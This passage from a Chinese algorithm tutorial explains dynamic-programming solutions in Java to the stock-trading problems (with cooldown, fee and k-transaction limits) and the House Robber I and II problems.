class="hljs-number">1</span>] + prices[i])<br>dp[i][<span class="hljs-number">1</span>] = max(dp[i-<span class="hljs-number">1</span>][<span class="hljs-number">1</span>], dp[i-<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] - prices[i])<br></code></pre></td></tr></table></figure><p>直接翻译成代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">maxProfit_k_inf</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] prices)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> n = prices.length;<br>    <span class="hljs-keyword">int</span> dp_i_0 = <span class="hljs-number">0</span>, dp_i_1 = Integer.MIN_VALUE;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        <span class="hljs-keyword">int</span> temp = dp_i_0;<br>        dp_i_0 = Math.max(dp_i_0, dp_i_1 + prices[i]);<br>        dp_i_1 = Math.max(dp_i_1, temp - prices[i]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> dp_i_0;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>第三题，k = +infinity with cooldown</strong></p><p>每次 sell 之后要等一天才能继续交易。只要把这个特点融入上一题的状态转移方程即可：</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs inform7">dp<span class="hljs-comment">[i]</span><span class="hljs-comment">[0]</span> = max(dp<span class="hljs-comment">[i-1]</span><span class="hljs-comment">[0]</span>, dp<span class="hljs-comment">[i-1]</span><span class="hljs-comment">[1]</span> + prices<span class="hljs-comment">[i]</span>)<br>dp<span class="hljs-comment">[i]</span><span class="hljs-comment">[1]</span> = max(dp<span class="hljs-comment">[i-1]</span><span class="hljs-comment">[1]</span>, dp<span class="hljs-comment">[i-2]</span><span class="hljs-comment">[0]</span> - prices<span class="hljs-comment">[i]</span>)<br>解释：第 i 天选择 buy 的时候，要从 i-2 的状态转移，而不是 i-1 。<br></code></pre></td></tr></table></figure><p>翻译成代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">maxProfit_with_cool</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] prices)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> n = prices.length;<br>    <span class="hljs-keyword">int</span> dp_i_0 = <span class="hljs-number">0</span>, dp_i_1 = Integer.MIN_VALUE;<br>    <span class="hljs-keyword">int</span> dp_pre_0 = <span class="hljs-number">0</span>; <span class="hljs-comment">// 代表 dp[i-2][0]</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        <span class="hljs-keyword">int</span> temp = dp_i_0;<br>        dp_i_0 = Math.max(dp_i_0, dp_i_1 + prices[i]);<br>        dp_i_1 = Math.max(dp_i_1, dp_pre_0 - prices[i]);<br>        dp_pre_0 = temp;<br>    &#125;<br>    <span class="hljs-keyword">return</span> dp_i_0;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>第四题，k = +infinity with fee</strong></p><p>每次交易要支付手续费，只要把手续费从利润中减去即可。改写方程：</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs inform7">dp<span class="hljs-comment">[i]</span><span class="hljs-comment">[0]</span> = max(dp<span class="hljs-comment">[i-1]</span><span class="hljs-comment">[0]</span>, dp<span class="hljs-comment">[i-1]</span><span class="hljs-comment">[1]</span> + prices<span class="hljs-comment">[i]</span>)<br>dp<span class="hljs-comment">[i]</span><span class="hljs-comment">[1]</span> = max(dp<span class="hljs-comment">[i-1]</span><span class="hljs-comment">[1]</span>, dp<span class="hljs-comment">[i-1]</span><span class="hljs-comment">[0]</span> - prices<span class="hljs-comment">[i]</span> - fee)<br>解释：相当于买入股票的价格升高了。<br>在第一个式子里减也是一样的，相当于卖出股票的价格减小了。<br></code></pre></td></tr></table></figure><p>直接翻译成代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">maxProfit_with_fee</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] prices, <span class="hljs-keyword">int</span> fee)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> n = prices.length;<br>    <span class="hljs-keyword">int</span> dp_i_0 = <span class="hljs-number">0</span>, dp_i_1 = Integer.MIN_VALUE;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        <span class="hljs-keyword">int</span> temp = dp_i_0;<br>        dp_i_0 = Math.max(dp_i_0, dp_i_1 + prices[i]);<br>        dp_i_1 = Math.max(dp_i_1, temp - prices[i] - fee);<br>    &#125;<br>    <span class="hljs-keyword">return</span> dp_i_0;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>第五题，k = 2</strong></p><p>k = 2 和前面题目的情况稍微不同，因为上面的情况都和 k 的关系不太大。要么 k 是正无穷，状态转移和 k 没关系了；要么 k = 1，跟 k = 0 这个 base case 挨得近，最后也没有存在感。</p><p>这道题 k = 2 和后面要讲的 k 是任意正整数的情况中，对 k 的处理就凸显出来了。我们直接写代码，边写边分析原因。</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs inform7">原始的动态转移方程，没有可化简的地方<br>dp<span class="hljs-comment">[i]</span><span class="hljs-comment">[k]</span><span class="hljs-comment">[0]</span> = max(dp<span class="hljs-comment">[i-1]</span><span class="hljs-comment">[k]</span><span class="hljs-comment">[0]</span>, dp<span class="hljs-comment">[i-1]</span><span class="hljs-comment">[k]</span><span class="hljs-comment">[1]</span> + prices<span class="hljs-comment">[i]</span>)<br>dp<span class="hljs-comment">[i]</span><span class="hljs-comment">[k]</span><span class="hljs-comment">[1]</span> = max(dp<span class="hljs-comment">[i-1]</span><span class="hljs-comment">[k]</span><span class="hljs-comment">[1]</span>, dp<span class="hljs-comment">[i-1]</span><span class="hljs-comment">[k-1]</span><span class="hljs-comment">[0]</span> - prices<span class="hljs-comment">[i]</span>)<br></code></pre></td></tr></table></figure><p>按照之前的代码，我们可能想当然这样写代码（错误的）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">int</span> k = <span class="hljs-number">2</span>;<br><span class="hljs-keyword">int</span>[][][] dp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[n][k + <span class="hljs-number">1</span>][<span class="hljs-number">2</span>];<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    <span class="hljs-keyword">if</span> (i - <span class="hljs-number">1</span> == -<span class="hljs-number">1</span>) &#123; <span class="hljs-comment">/* 处理一下 base case*/</span> &#125;<br>    dp[i][k][<span class="hljs-number">0</span>] = Math.max(dp[i-<span class="hljs-number">1</span>][k][<span class="hljs-number">0</span>], dp[i-<span class="hljs-number">1</span>][k][<span class="hljs-number">1</span>] + prices[i]);<br>    dp[i][k][<span class="hljs-number">1</span>] = Math.max(dp[i-<span class="hljs-number">1</span>][k][<span class="hljs-number">1</span>], dp[i-<span class="hljs-number">1</span>][k-<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] - prices[i]);<br>&#125;<br><span class="hljs-keyword">return</span> dp[n - <span class="hljs-number">1</span>][k][<span class="hljs-number">0</span>];<br></code></pre></td></tr></table></figure><p>为什么错误？我这不是照着状态转移方程写的吗？</p><p>还记得前面总结的「穷举框架」吗？就是说我们必须穷举所有状态。其实我们之前的解法，都在穷举所有状态，只是之前的题目中 k 都被化简掉了。比如说第一题，k = 1</p><p>这道题由于没有消掉 k 的影响，所以必须要对 k 进行穷举：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">int</span> max_k = <span class="hljs-number">2</span>;<br><span class="hljs-keyword">int</span>[][][] dp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[n][max_k + <span class="hljs-number">1</span>][<span class="hljs-number">2</span>];<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> k = max_k; k &gt;= <span class="hljs-number">1</span>; k--) &#123;<br>        <span class="hljs-keyword">if</span> (i - <span class="hljs-number">1</span> == -<span class="hljs-number">1</span>) &#123; <span class="hljs-comment">/*处理 base case */</span> &#125;<br>        dp[i][k][<span class="hljs-number">0</span>] = max(dp[i-<span class="hljs-number">1</span>][k][<span class="hljs-number">0</span>], dp[i-<span class="hljs-number">1</span>][k][<span class="hljs-number">1</span>] + prices[i]);<br>        dp[i][k][<span class="hljs-number">1</span>] = max(dp[i-<span class="hljs-number">1</span>][k][<span class="hljs-number">1</span>], dp[i-<span class="hljs-number">1</span>][k-<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] - prices[i]);<br>    &#125;<br>&#125;<br><span class="hljs-comment">// 穷举了 n × max_k × 2 个状态，正确。</span><br><span class="hljs-keyword">return</span> dp[n - <span class="hljs-number">1</span>][max_k][<span class="hljs-number">0</span>];<br></code></pre></td></tr></table></figure><p>如果你不理解，可以返回第一点「穷举框架」重新阅读体会一下。</p><p>这里 k 取值范围比较小，所以可以不用 for 循环，直接把 k = 1 和 2 的情况全部列举出来也可以：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java">dp[i][<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] = max(dp[i-<span class="hljs-number">1</span>][<span class="hljs-number">2</span>][<span class="hljs-number">0</span>], dp[i-<span class="hljs-number">1</span>][<span class="hljs-number">2</span>][<span class="hljs-number">1</span>] + prices[i])<br>dp[i][<span class="hljs-number">2</span>][<span class="hljs-number">1</span>] = max(dp[i-<span class="hljs-number">1</span>][<span class="hljs-number">2</span>][<span class="hljs-number">1</span>], dp[i-<span class="hljs-number">1</span>][<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] - prices[i])<br>dp[i][<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] = max(dp[i-<span class="hljs-number">1</span>][<span class="hljs-number">1</span>][<span class="hljs-number">0</span>], dp[i-<span class="hljs-number">1</span>][<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] + prices[i])<br>dp[i][<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] = max(dp[i-<span class="hljs-number">1</span>][<span class="hljs-number">1</span>][<span class="hljs-number">1</span>], -prices[i])<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">maxProfit_k_2</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] prices)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> dp_i10 = <span class="hljs-number">0</span>, dp_i11 = Integer.MIN_VALUE;<br>    <span class="hljs-keyword">int</span> dp_i20 = <span class="hljs-number">0</span>, dp_i21 = Integer.MIN_VALUE;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> price : prices) &#123;<br>        dp_i20 = Math.max(dp_i20, dp_i21 + price);<br>        dp_i21 = Math.max(dp_i21, dp_i10 - price);<br>        dp_i10 = Math.max(dp_i10, dp_i11 + price);<br>        dp_i11 = Math.max(dp_i11, -price);<br>    &#125;<br>    <span class="hljs-keyword">return</span> dp_i20;<br>&#125;<br></code></pre></td></tr></table></figure><p>有状态转移方程和含义明确的变量名指导，相信你很容易看懂。其实我们可以故弄玄虚，把上述四个变量换成 a, b, c, d。这样当别人看到你的代码时就会大惊失色，对你肃然起敬。</p><p><strong>第六题，k = any integer</strong></p><p>有了上一题 k = 2 的铺垫，这题应该和上一题的第一个解法没啥区别。但是出现了一个超内存的错误，原来是传入的 k 值会非常大，dp 数组太大了。现在想想，交易次数 k 最多有多大呢？</p><p>一次交易由买入和卖出构成，至少需要两天。所以说有效的限制 k 应该不超过 n/2，如果超过，就没有约束作用了，相当于 k = +infinity。这种情况是之前解决过的。</p><p>直接把之前的代码重用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">maxProfit_k_any</span><span class="hljs-params">(<span class="hljs-keyword">int</span> max_k, <span class="hljs-keyword">int</span>[] prices)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> n = prices.length;<br>    <span class="hljs-keyword">if</span> (max_k &gt; n / <span class="hljs-number">2</span>) <br>        <span class="hljs-keyword">return</span> maxProfit_k_inf(prices);<br><br>    <span class="hljs-keyword">int</span>[][][] dp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[n][max_k + <span class="hljs-number">1</span>][<span class="hljs-number">2</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) <br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> k = max_k; k &gt;= <span class="hljs-number">1</span>; k--) &#123;<br>            <span class="hljs-keyword">if</span> (i - <span class="hljs-number">1</span> == -<span class="hljs-number">1</span>) &#123; <span class="hljs-comment">/* 处理 base case */</span> &#125;<br>            dp[i][k][<span class="hljs-number">0</span>] = max(dp[i-<span class="hljs-number">1</span>][k][<span class="hljs-number">0</span>], dp[i-<span class="hljs-number">1</span>][k][<span class="hljs-number">1</span>] + prices[i]);<br>            dp[i][k][<span class="hljs-number">1</span>] = max(dp[i-<span class="hljs-number">1</span>][k][<span class="hljs-number">1</span>], dp[i-<span class="hljs-number">1</span>][k-<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] - prices[i]);     <br>        &#125;<br>    <span class="hljs-keyword">return</span> dp[n - <span class="hljs-number">1</span>][max_k][<span class="hljs-number">0</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>至此，6 道题目通过一个状态转移方程全部解决。</p><p><strong>四、最后总结</strong></p><p>本文给大家讲了如何通过状态转移的方法解决复杂的问题，用一个状态转移方程秒杀了 6 道股票买卖问题，现在想想，其实也不算难对吧？这已经属于动态规划问题中较困难的了。</p><p>关键就在于列举出所有可能的「状态」，然后想想怎么穷举更新这些「状态」。一般用一个多维 dp 数组储存这些状态，从 base case 开始向后推进，推进到最后的状态，就是我们想要的答案。想想这个过程，你是不是有点理解「动态规划」这个名词的意义了呢？</p><p>具体到股票买卖问题，我们发现了三个状态，使用了一个三维数组，无非还是穷举 + 更新，不过我们可以说的高大上一点，这叫「三维 DP」。</p><h2 id="8-2-打家劫舍"><a href="#8-2-打家劫舍" class="headerlink" title="8.2 打家劫舍"></a>8.2 打家劫舍</h2><p><strong>House Robber I</strong></p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/打家劫舍.jpg" alt="打家劫舍"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">rob</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span></span>;<br></code></pre></td></tr></table></figure><p>题目很容易理解，而且动态规划的特征很明显。我们前文 <a href="http://mp.weixin.qq.com/s?__biz=MzAxODQxMDM0Mw==&amp;mid=2247484731&amp;idx=1&amp;sn=f1db6dee2c8e70c42240aead9fd224e6&amp;chksm=9bd7fb33aca07225bee0b23a911c30295e0b90f393af75eca377caa4598ffb203549e1768336&amp;scene=21#wechat_redirect">动态规划详解</a> 做过总结，<strong>解决动态规划问题就是找「状态」和「选择」，仅此而已</strong>。</p><p>假想你就是这个专业强盗，从左到右走过这一排房子，在每间房子前都有两种<strong>选择</strong>：抢或者不抢。</p><p>如果你抢了这间房子，那么你肯定不能抢相邻的下一间房子了，只能从<strong>下下间</strong>房子开始做选择。</p><p>如果你不抢这间房子，那么你可以走到<strong>下一间</strong>房子前，继续做选择。</p><p>当你走过了最后一间房子后，你就没得抢了，能抢到的钱显然是 0（<strong>base case</strong>）。</p><p>以上的逻辑很简单吧，其实已经明确了「状态」和「选择」：<strong>你面前房子的索引就是状态，抢和不抢就是选择</strong>。</p><p><img src="C:\Users\ASUS\Documents\MobileFile\IMG_0140(20210220-000336).JPG" alt="IMG_0140(http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/IMG_0140(20210220-000336).JPG)" style="zoom:50%;" /></p><p>在两个选择中，每次都选更大的结果，最后得到的就是最多能抢到的 money：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 主函数</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">rob</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> dp(nums, <span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-comment">// 返回 nums[start..] 能抢到的最大值</span><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> <span class="hljs-title">dp</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> start)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (start &gt;= nums.length) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">int</span> res = Math.max(<br>            <span class="hljs-comment">// 不抢，去下家</span><br>            dp(nums, start + <span class="hljs-number">1</span>), <br>            <span class="hljs-comment">// 抢，去下下家</span><br>            nums[start] + dp(nums, start + <span class="hljs-number">2</span>)<br>        );<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><p>明确了状态转移，就可以发现对于同一start位置，是存在重叠子问题的，比如下图：</p><p><img src="C:\Users\ASUS\Documents\MobileFile\IMG_0141(20210220-000606).JPG" alt="IMG_0141(http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/IMG_0141(20210220-000606).JPG)" style="zoom:50%;" /></p><p>盗贼有多种选择可以走到这个位置，如果每次到这都进入递归，岂不是浪费时间？所以说存在重叠子问题，可以用备忘录进行优化：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span>[] memo;<br><span class="hljs-comment">// 主函数</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">rob</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;<br>    <span class="hljs-comment">// 初始化备忘录</span><br>    memo = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[nums.length];<br>    Arrays.fill(memo, -<span class="hljs-number">1</span>);<br>    <span class="hljs-comment">// 强盗从第 0 间房子开始抢劫</span><br>    <span class="hljs-keyword">return</span> dp(nums, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-comment">// 返回 dp[start..] 能抢到的最大值</span><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> <span class="hljs-title">dp</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> start)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (start &gt;= nums.length) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-comment">// 避免重复计算</span><br>    <span class="hljs-keyword">if</span> (memo[start] != -<span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> memo[start];<br><br>    <span class="hljs-keyword">int</span> res = Math.max(dp(nums, start + <span class="hljs-number">1</span>), <br>                    nums[start] + dp(nums, start + <span class="hljs-number">2</span>));<br>    <span class="hljs-comment">// 记入备忘录</span><br>    memo[start] = res;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><p>这就是自顶向下的动态规划解法，我们也可以略作修改，写出<strong>自底向上</strong>的解法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">rob</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> n = nums.length;<br>    <span class="hljs-comment">// dp[i] = x 表示：</span><br>    <span class="hljs-comment">// 从第 i 间房子开始抢劫，最多能抢到的钱为 x</span><br>    <span class="hljs-comment">// base case: dp[n] = 0</span><br>    <span class="hljs-keyword">int</span>[] dp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[n + <span class="hljs-number">2</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = n - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>        dp[i] = Math.max(dp[i + <span class="hljs-number">1</span>], nums[i] + dp[i + <span class="hljs-number">2</span>]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> dp[<span class="hljs-number">0</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>我们又发现状态转移只和dp[i]最近的两个状态有关，所以可以进一步优化，将空间复杂度降低到 O(1)。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">rob</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> n = nums.length;<br>    <span class="hljs-comment">// 记录 dp[i+1] 和 dp[i+2]</span><br>    <span class="hljs-keyword">int</span> dp_i_1 = <span class="hljs-number">0</span>, dp_i_2 = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// 记录 dp[i]</span><br>    <span class="hljs-keyword">int</span> dp_i = <span class="hljs-number">0</span>; <br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = n - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>        dp_i = Math.max(dp_i_1, nums[i] + dp_i_2);<br>        dp_i_2 = dp_i_1;<br>        dp_i_1 = dp_i;<br>    &#125;<br>    <span class="hljs-keyword">return</span> dp_i;<br>&#125;<br></code></pre></td></tr></table></figure><p>以上的流程，在我们 <a href="http://mp.weixin.qq.com/s?__biz=MzAxODQxMDM0Mw==&amp;mid=2247484731&amp;idx=1&amp;sn=f1db6dee2c8e70c42240aead9fd224e6&amp;chksm=9bd7fb33aca07225bee0b23a911c30295e0b90f393af75eca377caa4598ffb203549e1768336&amp;scene=21#wechat_redirect">动态规划详解</a> 中详细解释过，相信大家都能手到擒来了。我认为很有意思的是这个问题的 follow up，需要基于我们现在的思路做一些巧妙的应变。</p><p><strong>House Robber II</strong></p><p>这道题目和第一道描述基本一样，强盗依然不能抢劫相邻的房子，输入依然是一个数组，但是告诉你<strong>这些房子不是一排，而是围成了一个圈</strong>。</p><p>也就是说，现在第一间房子和最后一间房子也相当于是相邻的，不能同时抢。比如说输入数组nums=[2,3,2]，算法返回的结果应该是 3 而不是 4，因为开头和结尾不能同时被抢。</p><p>这个约束条件看起来应该不难解决，我们前文 <a href="http://mp.weixin.qq.com/s?__biz=MzAxODQxMDM0Mw==&amp;mid=2247484525&amp;idx=1&amp;sn=3d2e63694607fec72455a52d9b15d4e5&amp;chksm=9bd7fa65aca073734df90b45054448e09c14e6e35ad7b778bff62f9bd6c2b4f6e1ca7bc4f844&amp;scene=21#wechat_redirect">单调栈 Monotonic Stack 的使用</a> 说过一种解决环形数组的方案，那么在这个问题上怎么处理呢？</p><p>首先，首尾房间不能同时被抢，那么只可能有三种不同情况：要么都不被抢；要么第一间房子被抢最后一间不抢；要么最后一间房子被抢第一间不抢。</p><p><img src="C:\Users\ASUS\Documents\MobileFile\IMG_0142(20210220-000612).JPG" alt="IMG_0142(http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/IMG_0142(20210220-000612).JPG)" style="zoom:50%;" /></p><p>那就简单了啊，这三种情况，哪种的结果最大，就是最终答案呗！不过，其实我们不需要比较三种情况，<strong>只要比较情况二和情况三就行了，因为这两种情况对于房子的选择余地比情况一大呀，房子里的钱数都是非负数，所以选择余地大，最优决策结果肯定不会小</strong>。</p><p>所以只需对之前的解法稍作修改即可：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">rob</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> n = nums.length;<br>    <span class="hljs-keyword">if</span> (n == <span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> nums[<span class="hljs-number">0</span>];<br>    <span class="hljs-keyword">return</span> Math.max(robRange(nums, <span class="hljs-number">0</span>, n - <span class="hljs-number">2</span>), <br>                    robRange(nums, <span class="hljs-number">1</span>, n - <span class="hljs-number">1</span>));<br>&#125;<br><br><span class="hljs-comment">// 仅计算闭区间 [start,end] 的最优结果</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">robRange</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> start, <span class="hljs-keyword">int</span> end)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> n = nums.length;<br>    <span class="hljs-keyword">int</span> dp_i_1 = <span 